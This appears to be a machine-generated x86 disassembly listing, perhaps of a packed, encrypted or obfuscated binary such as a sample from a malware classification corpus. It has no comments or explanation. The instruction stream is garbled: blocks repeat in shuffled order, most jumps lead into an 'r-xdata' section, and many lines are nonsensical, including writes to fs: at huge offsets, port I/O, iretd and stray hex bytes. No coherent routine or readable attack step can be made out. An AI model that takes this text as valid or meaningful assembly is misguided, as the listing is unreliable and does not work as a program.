sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_401fd8
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53a4e3
push esp
pushfd
push ecx
sub esp 0xc
call sub_401f55
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_401aaf
jns r-xdata
jns r-xdata
xor esi 0x58b93d7f
jno r-xdata
push ebp
call sub_401a34
mov [ fs : ebx - 0x7af0fb3c ] eax
mov esp 0xffffffe
test [ edi ] cl
adc [ eax + 0x5fffffe ] 0x59
sub eax 0xf08c483
xor [ ebx ] 0xb9000001
jae r-xdata
jno 0x7398751b
jg r-xdata
jne 0x24c12aff
jae r-xdata
sub ecx 0xe1813e75
pop eax
jae r-xdata
add eax 0xf9b7159
test [ edx + 0xf ] ebx
and [ edi + edi * 8 ] 0x15ffffff
or [ 0xffffffffff6d830f ] 0xfe9ffff
mov [ edx - 0x7f000000 ] ecx
iretd
jne r-xdata
and eax 0x8b0f327f
pop eax
pop ecx
jge r-xdata
jns r-xdata
jge 0xffffffffb8af9a36
pushfd
call sub_401a1f
mov eax [ fs : 0xffffffff9ce8c173 ]
push edi
push eax
push edx
call sub_401abf
ja 0x5049ec6
call [ 0x29e85351 ]
add [ eax ] al
add [ ecx + 0x515557e9 ] al
ja r-xdata
and ebx 0xcf812475
jno r-xdata
pop ecx
or eax 0xf04c483
mov ebp ebp
jno r-xdata
jmp [ 0xffffffff8f0f3973 ]
jae r-xdata
jae r-xdata
pop ecx
jno r-xdata
pop eax
jge r-xdata
call [ 0x25ff9e79 ]
pop edx
jg r-xdata
jpo 0xf70939c
jae r-xdata
sub eax 0x4d795a58
jg r-xdata
add edi 0x848f0f
add [ eax ] al
sub ecx 0x811f755a
pop eax
pop edx
jns r-xdata
mov esi 0x55559c9c
jae r-xdata
xor edx 0x8a810f
add [ eax ] al
jae r-xdata
je 0xffffffffa3a4c075
jg r-xdata
jg 0xffffffff9c946eaa
add esp 0x4
jns r-xdata
mov eax 0xc7819173
sbb [ edx + 0x58 ] 0xf8830f
add [ eax ] al
jne 0xf44ded6
push eax
push edi
push ebp
push ecx
and ecx 0xff378f0f
jg r-xdata
mov ecx 0xd8810f58
add [ eax ] al
add [ edi ] cl
sbb [ eax + 0x5a ] 0xd817358
ja r-xdata
and ecx 0xf681ad79
jns r-xdata
jmp 0xcaa3df
call sub_401b5f
xor edi 0x517f5859
jno 0xfffffffff2c1761c
push ecx
push ebx
call sub_401aaf
sub ecx 0x50515557
and esi 0x73595958
out 0x81 al
0x830f
jns r-xdata
push esi
push esi
call sub_401baa
sub ebx 0xfeace855
pushfd
pushfd
push ebp
push ebp
jpo 0x53bd74a1
push edx
call sub_401ae0
or edi 0x830f5858
jne r-xdata
pop eax
jns r-xdata
sub eax 0xfec5e89c
add [ eax + eax - 0x7af10000 ] 0xea810971
jg r-xdata
mov [ fs : 0xffffffff840f0e79 ] eax
jno 0x16400879
jae r-xdata
je 0xffffffff814fbc75
jne r-xdata
jno 0xffffffff834f72a3
xor edx 0x81257159
r-xdata
jg r-xdata
and ecx 0xd7850f
add [ eax ] al
clc
add [ eax ] al
add [ edi ] cl
test [ ebx - 0x7ef0fb3c ] eax
test [ eax ] al
add [ eax ] al
jne 0xffffffffeac123cf
sub_401abf
pop eax
pop edx
pop eax
jae r-xdata
pop edx
pop eax
jae r-xdata
or eax 0xff6d830f
pop eax
pop ecx
jge r-xdata
jne 0xf44ded6
pop ecx
or eax 0xf04c483
mov ebp ebp
add [ eax + eax - 0x7af10000 ] 0xea810971
jg r-xdata
jne 0x24c12aff
jno r-xdata
push ebp
call sub_401a34
mov [ fs : ebx - 0x7af0fb3c ] eax
mov esp 0xffffffe
test [ edi ] cl
adc [ eax + 0x5fffffe ] 0x59
sub eax 0xf08c483
xor [ ebx ] 0xb9000001
jne r-xdata
and eax 0x8b0f327f
jae r-xdata
sub ecx 0xe1813e75
pushfd
call sub_401a1f
mov eax [ fs : 0xffffffff9ce8c173 ]
push edi
push eax
push edx
call sub_401abf
ja 0x5049ec6
call [ 0x29e85351 ]
add [ eax ] al
add [ ecx + 0x515557e9 ] al
jns r-xdata
jge 0xffffffffb8af9a36
jae r-xdata
pop ecx
jno r-xdata
jno r-xdata
jmp [ 0xffffffff8f0f3973 ]
jae r-xdata
pop eax
pop edx
jns r-xdata
mov esi 0x55559c9c
jae r-xdata
xor edx 0x8a810f
add [ eax ] al
jae r-xdata
sub eax 0x4d795a58
jg r-xdata
add edi 0x848f0f
add [ eax ] al
sub ecx 0x811f755a
ja r-xdata
and ecx 0xf681ad79
jns r-xdata
jmp 0xcaa3df
jg r-xdata
mov ecx 0xd8810f58
add [ eax ] al
add [ edi ] cl
sbb [ eax + 0x5a ] 0xd817358
push eax
push edi
push ebp
push ecx
and ecx 0xff378f0f
jno 0x16400879
pop edx
jg r-xdata
jpo 0xf70939c
jg r-xdata
mov [ fs : 0xffffffff840f0e79 ] eax
add esp 0x4
jns r-xdata
mov eax 0xc7819173
sbb [ edx + 0x58 ] 0xf8830f
add [ eax ] al
jns r-xdata
xor edx 0x81257159
r-xdata
pop eax
jns r-xdata
sub eax 0xfec5e89c
jae r-xdata
je 0xffffffff814fbc75
jne r-xdata
jno 0xffffffff834f72a3
jg r-xdata
jg 0xffffffff9c946eaa
ja r-xdata
jg r-xdata
and ecx 0xd7850f
add [ eax ] al
clc
add [ eax ] al
add [ edi ] cl
test [ ebx - 0x7ef0fb3c ] eax
test [ eax ] al
add [ eax ] al
jne 0xffffffffeac123cf
push esi
push esi
call sub_401baa
sub ebx 0xfeace855
pushfd
pushfd
push ebp
push ebp
jpo 0x53bd74a1
push edx
call sub_401ae0
or edi 0x830f5858
jne r-xdata
pop eax
jge r-xdata
call [ 0x25ff9e79 ]
jns r-xdata
jae r-xdata
je 0xffffffffa3a4c075
call sub_401b5f
xor edi 0x517f5859
jno 0xfffffffff2c1761c
push ecx
push ebx
call sub_401aaf
sub ecx 0x50515557
and esi 0x73595958
out 0x81 al
0x830f
sub_401ae0
jg r-xdata
pop eax
add esp 0x4
sub ecx 0x811f755a
pop eax
pop edx
jns r-xdata
mov esi 0x55559c9c
ja r-xdata
and ecx 0xf681ad79
pop ecx
jno r-xdata
jno 0x16400879
jg r-xdata
mov ecx 0xd8810f58
add [ eax ] al
add [ edi ] cl
sbb [ eax + 0x5a ] 0xd817358
jae r-xdata
xor edx 0x8a810f
add [ eax ] al
jns r-xdata
jg r-xdata
mov [ fs : 0xffffffff840f0e79 ] eax
jns r-xdata
jmp 0xcaa3df
jno r-xdata
jmp [ 0xffffffff8f0f3973 ]
jns r-xdata
xor edx 0x81257159
r-xdata
pop edx
jg r-xdata
jpo 0xf70939c
jae r-xdata
sub eax 0x4d795a58
jae r-xdata
je 0xffffffff814fbc75
add esp 0x4
jns r-xdata
mov eax 0xc7819173
sbb [ edx + 0x58 ] 0xf8830f
add [ eax ] al
jne 0xf44ded6
push edi
push ebp
push ecx
and ecx 0xff378f0f
jg r-xdata
jg 0xffffffff9c946eaa
ja r-xdata
pop eax
jns r-xdata
sub eax 0xfec5e89c
add [ eax + eax - 0x7af10000 ] 0xea810971
push esi
push esi
call sub_401baa
sub ebx 0xfeace855
pushfd
pushfd
push ebp
push ebp
jpo 0x53bd74a1
push edx
call sub_401ae0
or edi 0x830f5858
jne r-xdata
pop eax
jge r-xdata
call [ 0x25ff9e79 ]
jne r-xdata
jno 0xffffffff834f72a3
push ebp
call sub_401a34
mov [ fs : ebx - 0x7af0fb3c ] eax
mov esp 0xffffffe
test [ edi ] cl
adc [ eax + 0x5fffffe ] 0x59
sub eax 0xf08c483
xor [ ebx ] 0xb9000001
or eax 0xf04c483
mov ebp ebp
jae r-xdata
je 0xffffffffa3a4c075
jg r-xdata
push eax
and ecx 0xd7850f
add [ eax ] al
clc
add [ eax ] al
add [ edi ] cl
test [ ebx - 0x7ef0fb3c ] eax
test [ eax ] al
add [ eax ] al
jne 0xffffffffeac123cf
jg r-xdata
jne 0x24c12aff
jae r-xdata
sub ecx 0xe1813e75
call sub_401b5f
xor edi 0x517f5859
jno 0xfffffffff2c1761c
push ecx
push ebx
call sub_401aaf
sub ecx 0x50515557
and esi 0x73595958
out 0x81 al
0x830f
jns r-xdata
jne r-xdata
and eax 0x8b0f327f
pop eax
pop ecx
jge r-xdata
jge 0xffffffffb8af9a36
pushfd
call sub_401a1f
mov eax [ fs : 0xffffffff9ce8c173 ]
push edi
push eax
push edx
call sub_401abf
ja 0x5049ec6
call [ 0x29e85351 ]
add [ eax ] al
add [ ecx + 0x515557e9 ] al
jno r-xdata
pop ecx
jae r-xdata
jae r-xdata
jg r-xdata
add edi 0x848f0f
add [ eax ] al
sub_401b2b
pop eax
pop ecx
pop ecx
jae r-xdata
pop eax
pop eax
jae r-xdata
or edx 0xff50830f
pop ecx
pop eax
jg r-xdata
mov ebx 0x8f0f6975
pop edx
jne r-xdata
jno 0xfffffffff2c1761c
push ecx
push ebx
call sub_401aaf
sub ecx 0x50515557
and esi 0x73595958
out 0x81 al
0x830f
pushfd
push ebx
push esp
pushfd
add esi 0xf337d58
test [ edi - 0x5b ] bh
pop ecx
jno r-xdata
jno 0x16400879
jae r-xdata
xor edx 0x8a810f
add [ eax ] al
jns r-xdata
jns r-xdata
jmp 0xcaa3df
jg r-xdata
mov ecx 0xd8810f58
add [ eax ] al
add [ edi ] cl
sbb [ eax + 0x5a ] 0xd817358
jno r-xdata
jmp [ 0xffffffff8f0f3973 ]
pop edx
jg r-xdata
jpo 0xf70939c
jg r-xdata
mov [ fs : 0xffffffff840f0e79 ] eax
jae r-xdata
sub eax 0x4d795a58
add esp 0x4
jns r-xdata
mov eax 0xc7819173
sbb [ edx + 0x58 ] 0xf8830f
add [ eax ] al
jne 0xf44ded6
jns r-xdata
xor edx 0x81257159
r-xdata
call sub_401b5f
xor edi 0x517f5859
push edi
push ebp
push ecx
and ecx 0xff378f0f
pop eax
jns r-xdata
sub eax 0xfec5e89c
add [ eax + eax - 0x7af10000 ] 0xea810971
jae r-xdata
je 0xffffffff814fbc75
jne r-xdata
jno 0xffffffff834f72a3
push ebp
call sub_401a34
mov [ fs : ebx - 0x7af0fb3c ] eax
mov esp 0xffffffe
test [ edi ] cl
adc [ eax + 0x5fffffe ] 0x59
sub eax 0xf08c483
xor [ ebx ] 0xb9000001
jg r-xdata
jg 0xffffffff9c946eaa
ja r-xdata
jg r-xdata
push eax
and ecx 0xd7850f
add [ eax ] al
clc
add [ eax ] al
add [ edi ] cl
test [ ebx - 0x7ef0fb3c ] eax
test [ eax ] al
add [ eax ] al
jne 0xffffffffeac123cf
jg r-xdata
jne 0x24c12aff
jae r-xdata
sub ecx 0xe1813e75
pushfd
pushfd
push ebp
push ebp
jpo 0x53bd74a1
push edx
call sub_401ae0
or edi 0x830f5858
jne r-xdata
pop eax
jge r-xdata
call [ 0x25ff9e79 ]
jns r-xdata
jne r-xdata
and eax 0x8b0f327f
pop eax
pop ecx
jge r-xdata
jge 0xffffffffb8af9a36
pushfd
call sub_401a1f
mov eax [ fs : 0xffffffff9ce8c173 ]
push edi
push eax
push edx
call sub_401abf
ja 0x5049ec6
call [ 0x29e85351 ]
add [ eax ] al
add [ ecx + 0x515557e9 ] al
or eax 0xf04c483
mov ebp ebp
jae r-xdata
je 0xffffffffa3a4c075
jno r-xdata
pop ecx
jae r-xdata
jae r-xdata
jg r-xdata
add edi 0x848f0f
add [ eax ] al
sub ecx 0x811f755a
pop eax
pop edx
jns r-xdata
push esi
push esi
call sub_401baa
sub ebx 0xfeace855
mov esi 0x55559c9c
ja r-xdata
and ecx 0xf681ad79
sub_401b5f
pushfd
jae r-xdata
pop eax
pop edx
jns r-xdata
mov esi 0x55559c9c
ja r-xdata
and ecx 0xf681ad79
pop ecx
jno r-xdata
jno 0x16400879
jg r-xdata
mov ecx 0xd8810f58
add [ eax ] al
add [ edi ] cl
sbb [ eax + 0x5a ] 0xd817358
jae r-xdata
xor edx 0x8a810f
add [ eax ] al
jns r-xdata
jg r-xdata
mov [ fs : 0xffffffff840f0e79 ] eax
jns r-xdata
jmp 0xcaa3df
jno r-xdata
jmp [ 0xffffffff8f0f3973 ]
jns r-xdata
xor edx 0x81257159
r-xdata
pop edx
jg r-xdata
jpo 0xf70939c
jae r-xdata
sub eax 0x4d795a58
jae r-xdata
je 0xffffffff814fbc75
add esp 0x4
jns r-xdata
mov eax 0xc7819173
sbb [ edx + 0x58 ] 0xf8830f
add [ eax ] al
jne 0xf44ded6
push edi
push ebp
push ecx
and ecx 0xff378f0f
jg r-xdata
jg 0xffffffff9c946eaa
ja r-xdata
pop eax
jns r-xdata
sub eax 0xfec5e89c
add [ eax + eax - 0x7af10000 ] 0xea810971
push esi
push esi
call sub_401baa
sub ebx 0xfeace855
pushfd
pushfd
push ebp
push ebp
jpo 0x53bd74a1
push edx
call sub_401ae0
or edi 0x830f5858
jne r-xdata
pop eax
jge r-xdata
call [ 0x25ff9e79 ]
jne r-xdata
jno 0xffffffff834f72a3
push ebp
call sub_401a34
mov [ fs : ebx - 0x7af0fb3c ] eax
mov esp 0xffffffe
test [ edi ] cl
adc [ eax + 0x5fffffe ] 0x59
sub eax 0xf08c483
xor [ ebx ] 0xb9000001
or eax 0xf04c483
mov ebp ebp
jae r-xdata
je 0xffffffffa3a4c075
jg r-xdata
push eax
and ecx 0xd7850f
add [ eax ] al
clc
add [ eax ] al
add [ edi ] cl
test [ ebx - 0x7ef0fb3c ] eax
test [ eax ] al
add [ eax ] al
jne 0xffffffffeac123cf
jg r-xdata
jne 0x24c12aff
jae r-xdata
sub ecx 0xe1813e75
call sub_401b5f
xor edi 0x517f5859
jno 0xfffffffff2c1761c
push ecx
push ebx
call sub_401aaf
sub ecx 0x50515557
and esi 0x73595958
out 0x81 al
0x830f
jns r-xdata
jne r-xdata
and eax 0x8b0f327f
pop eax
pop ecx
jge r-xdata
jge 0xffffffffb8af9a36
push edi
push eax
push edx
call sub_401abf
ja 0x5049ec6
pushfd
call sub_401a1f
mov eax [ fs : 0xffffffff9ce8c173 ]
call [ 0x29e85351 ]
add [ eax ] al
add [ ecx + 0x515557e9 ] al
jno r-xdata
pop ecx
jae r-xdata
jg r-xdata
add edi 0x848f0f
add [ eax ] al
sub ecx 0x811f755a
sub_401baa
sub [ esp + 0x40 ] r-xdata
sub esp 0x10
pop edx
ja r-xdata
jg r-xdata
jmp [ 0xce8d0f ]
jge r-xdata
jmp 0xffffffff844f4d60
jno r-xdata
sub esi 0x73bd047f
push ebp
ja r-xdata
jmp [ 0xfffffffff381df77 ]
pop eax
jne r-xdata
xor edi 0x9b810f
add [ eax ] al
jl 0xfffffffff6c1da8f
jne r-xdata
add edi 0xad850f58
add [ eax ] al
add al ch
ja r-xdata
call 0xffc959e
cmp [ edi + 0x7f ] 0x81

ja r-xdata
jg r-xdata
xor esi 0x25ffca77
jg r-xdata
jo 0xffffffffcbc19bc9
jns r-xdata
mov edi 0x9c555757
jge r-xdata
jmp [ 0xffffffff8964ba73 ]
jg r-xdata
add ecx 0xaa890f
add [ eax ] al
jns r-xdata
mov [ fs : edi ] ecx
or esp 0x0
add [ eax ] al
jns r-xdata
mov ebp 0x79055573
sub [ ebx - 0x7ed288a6 ] edi
jae r-xdata
xor ebx 0xff728f0f
jae r-xdata
ja 0xffffffff89a45965
jge r-xdata
call [ 0xffffffffca81677d ]
jae r-xdata
xor ecx 0xc18d0f
add [ eax ] al
ja r-xdata
mov ebp 0xf5d7d58
cmp [ ebp + 0x36 ] 0x3d77870f
jns r-xdata
test [ edi ] 0x9b81
add [ edi ] cl
mov ebx 0x812d775a
jg r-xdata
and ebx 0xff5a870f
jg r-xdata
pop edx
pop edx
jno r-xdata
mov esi 0x83555251
in al dx
add al 0xe8
sti
add [ eax ] al
add [ ecx - 0xb1800d ] al
adc eax 0xc181727f
sub [ esp + 0x58 ] 0x2
sub esp 0x14
pop ecx
jne r-xdata
je 0xffffffffffa3a400
ja r-xdata
jge 0x71fc5c07
jge r-xdata
mov [ fs : edi - 0x21 ] esi
jae r-xdata
or edx 0xf0c775a
xor [ ebx + 0x3e ] 0x5a59ef81
jne r-xdata
push ebp
pushfd
call sub_401d08
mov edx 0x7504c483
rol [ ecx + 0x108f0fc2 ] 0xff
mov esp 0xe2818371
jne r-xdata
jno r-xdata
mov ebx 0xf04c483
jno r-xdata
mov [ fs : edx + 0x5a ] ebx
add [ ecx + 0x42850fe2 ] 0xffffffff
jne r-xdata
or edx 0xf3812e79
pushfd
push esi
call sub_401cff
sub ebx 0xa48f0f
add [ eax ] al
sub [ ecx + 0x1 ] 0x0
add [ edi ] cl
adc [ edi + edx * 2 + 0x56 ] 0x55
call sub_401e19
add esi 0xa6830f
add [ eax ] al
mov esp 0x58246c83
add al [ ebx + 0xf5914ec ]
test esp ebx
add [ eax ] al
add [ ebx + 0xf04c483 ] bh
add esp 0x4
jne r-xdata
mov eax [ fs : 0xff37958 ]
test [ ebx - 0x1e ] esi
pop eax
jge r-xdata
jge 0xffffffffffa29fb4
pop eax
ja r-xdata
xor edx 0x880f5e7f
add [ eax ] al
jno r-xdata
sub esi 0x89641f79
jg r-xdata
xor ecx 0xff70810f
jg r-xdata
or eax 0x97e8569c
add [ eax ] al
add [ ecx - 0x5b70f015 ] al
add [ eax ] al
add [ ecx + 0xc775aca ] al
jno 0xffffffffefc15aee
jae r-xdata
add edx 0xff108f0f
pop ecx
jns r-xdata
jno 0xffffffff874f5267
jne r-xdata
sub edi 0x64244481
movsd [ edi ] [ esi ]
and eax [ eax ]
add esp 0x4
ja r-xdata
jl 0xffffffffffacad2c
jae r-xdata
ja 0xffffffffa3c32cc4
push ecx
push edx
push ebp
sub esp 0x4
call sub_401ccb
xor ebx 0x15ff4e7f
mov edx 0xff47830f
ja r-xdata
or ebx 0xff6e8f0f
jae r-xdata
call [ 0xffffffffc181727f ]
ja r-xdata
pop edx
mov eax 0xff55870f
jg r-xdata
jpo 0xdea2aa
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
jge r-xdata
add esi 0x83575554
in al dx
add al 0xe8
jae r-xdata
sub ecx 0xfeea830f
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
ja r-xdata
xor ebx 0xff3d870f
call sub_401c7b
and ecx 0x6c870f59
push edi
push edi
push ebp
pushfd
add eax 0xde810f
add [ eax ] al
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_402099
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
jg r-xdata
sub edi 0xf681b871
jne r-xdata
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
xor al [ ecx ]
add [ eax ] al
jae r-xdata
jmp 0xffffffffff799dc2
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff92722
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
push edx
push esp
push edx
call sub_401d2b
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jae r-xdata
and esi 0x89641273
jae r-xdata
mov ebp 0x478f0f5a
jg r-xdata
add eax 0x5abb2979
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x7548e2de
jg r-xdata
ja 0xcaa0da
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop ecx
jno r-xdata
call 0xf44e50d
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
pop eax
pop eax
pop edx
jne r-xdata
call 0xf48e1e4
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
ja 0xffffffffff9b9f81
pop edx
jge r-xdata
jo 0xffffffff854f77d3
pop eax
jae r-xdata
and esi 0xc2817577
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f44e299
add [ eax ] al
dec ecx
pop ecx
jne r-xdata
jbe 0xffcefd8
jae r-xdata
call sub_401e90
jb 0xffffffff81b29b46
or edx 0x54549c55
jno r-xdata
and ebx 0x870f4975
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804f92f4
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
jno r-xdata
jge 0xffffffffffa0a317
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
jae r-xdata
xor esi 0xe681cd75
jae r-xdata
and edx 0xff53830f
pop edx
pop edx
jne r-xdata
jne r-xdata
mov eax 0xfeef890f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
jge r-xdata
jpe 0x74cd2f1b
add esp 0x4
jae r-xdata
jl 0xf3a05c
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
push esp
push ebp
push edi
sub esp 0x4
call sub_401d36
jae 0xffffffffff43a55b
xor ecx 0x890fd079
or esi 0xff24810f
ja r-xdata
and eax 0x4c48358
pop eax
jg r-xdata
jge 0xffffffff894f7755
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jns r-xdata
sub ebx 0xe8525452
insb
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
ja r-xdata
jno 0xffffffffe89171f2
push 0x81ffffff
out 0x77 al
jne r-xdata
sub esp 0x28
pop ecx
pop edx
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub ebx 0xff2f850f
jns 0x158a2b6
push edi
call sub_401f88
jg 0xfffffffff0b379af
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133ae32
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
add [ eax ] al
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x586614ab
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a7985
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jno r-xdata
jae 0xffffffff842897d1
jae r-xdata
call 0xffffffff854f79bf
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95bc60
jo 0xffffffffa2c12e73
push ecx
push edx
call sub_401f58
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c152b5
push edx
call sub_401ef4
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_401f6f
jo 0xff9955c
jo 0xffffffff894f7999
jae r-xdata
je 0xffffffffff6da3a3
jge r-xdata
les ecx [ eax ]
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_401f32
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_401fd8
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53a4e3
push esp
pushfd
push ecx
sub esp 0xc
call sub_401f55
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_401c7b
pop ecx
pop edx
add esp 0x4
jne r-xdata
mov eax [ fs : 0xff37958 ]
test [ ebx - 0x1e ] esi
jae r-xdata
add edx 0xff108f0f
pop edx
mov eax 0xff55870f
pop eax
jne r-xdata
xor edi 0x9b810f
add [ eax ] al
jl 0xfffffffff6c1da8f
ja r-xdata
call 0xffc959e
cmp [ edi + 0x7f ] 0x81

ja r-xdata
jns r-xdata
mov edi 0x9c555757
jge r-xdata
jmp [ 0xffffffff8964ba73 ]
jae r-xdata
xor ebx 0xff728f0f
jae r-xdata
ja 0xffffffff89a45965
jg r-xdata
and ebx 0xff5a870f
jns r-xdata
mov [ fs : edi ] ecx
or esp 0x0
add [ eax ] al
pop edx
pop edx
jae r-xdata
jne r-xdata
or edx 0xf0c775a
xor [ ebx + 0x3e ] 0x5a59ef81
ja r-xdata
jg r-xdata
mov ebp 0xf5d7d58
cmp [ ebp + 0x36 ] 0x3d77870f
jne r-xdata
add edi 0xad850f58
add [ eax ] al
add al ch
jae r-xdata
ja r-xdata
xor ecx 0xc18d0f
add [ eax ] al
sub esi 0x73bd047f
push ebp
pushfd
push esi
call sub_401cff
sub ebx 0xa48f0f
add [ eax ] al
mov esp 0x58246c83
add al [ ebx + 0xf5914ec ]
test esp ebx
add [ eax ] al
add [ ebx + 0xf04c483 ] bh
ja r-xdata
jge 0x71fc5c07
jg r-xdata
xor esi 0x25ffca77
jg r-xdata
jo 0xffffffffcbc19bc9
sub [ esp + 0x58 ] 0x2
sub esp 0x14
pop ecx
jne r-xdata
je 0xffffffffffa3a400
add [ eax ] al
jno r-xdata
mov [ fs : edx + 0x5a ] ebx
add [ ecx + 0x42850fe2 ] 0xffffffff
jg r-xdata
add ecx 0xaa890f
add [ eax ] al
jns r-xdata
mov ebp 0x79055573
sub [ ebx - 0x7ed288a6 ] edi
jno r-xdata
sub [ ecx + 0x1 ] 0x0
add [ edi ] cl
adc [ edi + edx * 2 + 0x56 ] 0x55
call sub_401e19
add esi 0xa6830f
add [ eax ] al
mov ebx 0xf04c483
jae r-xdata
ja 0xffffffffa3c32cc4
jno r-xdata
sub esi 0x89641f79
ja r-xdata
jge r-xdata
call [ 0xffffffffca81677d ]
jns r-xdata
test [ edi ] 0x9b81
add [ edi ] cl
mov ebx 0x812d775a
pop eax
ja r-xdata
xor edx 0x880f5e7f
jae r-xdata
sub ecx 0xfeea830f
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
push ecx
push edx
push ebp
sub esp 0x4
call sub_401ccb
xor ebx 0x15ff4e7f
mov edx 0xff47830f
jno r-xdata
mov esi 0x83555251
in al dx
add al 0xe8
sti
add [ eax ] al
add [ ecx - 0xb1800d ] al
adc eax 0xc181727f
jge r-xdata
mov [ fs : edi - 0x21 ] esi
jne r-xdata
sub edi 0x64244481
movsd [ edi ] [ esi ]
and eax [ eax ]
add esp 0x4
ja r-xdata
jl 0xffffffffffacad2c
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
xor al [ ecx ]
add [ eax ] al
push ebp
pushfd
call sub_401d08
mov edx 0x7504c483
rol [ ecx + 0x108f0fc2 ] 0xff
mov esp 0xe2818371
jne r-xdata
jne r-xdata
or edx 0xf3812e79
jg r-xdata
jpo 0xdea2aa
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
jge r-xdata
add esi 0x83575554
in al dx
add al 0xe8
jae r-xdata
mov ebp 0x478f0f5a
jae r-xdata
and esi 0x89641273
pop eax
jge r-xdata
jge 0xffffffffffa29fb4
jg r-xdata
xor ecx 0xff70810f
jg r-xdata
or eax 0x97e8569c
add [ eax ] al
add [ ecx - 0x5b70f015 ] al
add [ eax ] al
add [ ecx + 0xc775aca ] al
jno 0xffffffffefc15aee
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_402099
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
jg r-xdata
sub edi 0xf681b871
jne r-xdata
jg r-xdata
ja 0xffffffffff9b9f81
pop eax
pop eax
pop edx
jne r-xdata
call 0xf48e1e4
lea eax [ ecx + 0x1 ]
add [ eax ] al
pop ecx
jns r-xdata
jno 0xffffffff874f5267
ja r-xdata
or ebx 0xff6e8f0f
jae r-xdata
call [ 0xffffffffc181727f ]
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff92722
pop ecx
